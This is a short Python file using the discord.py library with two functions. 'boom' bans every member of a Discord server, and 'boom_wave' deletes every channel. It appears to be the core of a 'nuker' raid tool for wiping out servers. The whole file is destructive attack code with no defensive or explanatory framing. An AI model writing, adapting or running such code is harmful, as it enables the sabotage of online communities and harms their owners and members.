
import discord

async def boom(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban(reason = "nuclear")
        except Exception as e:
            print(e)
            




async def boom_wave(ctx):

    for channel in ctx.guild.channels:
        try:


            await channel.delete()
            print(f"{channel}  deleted")
        except Exception as e:
            print(e)
            break
   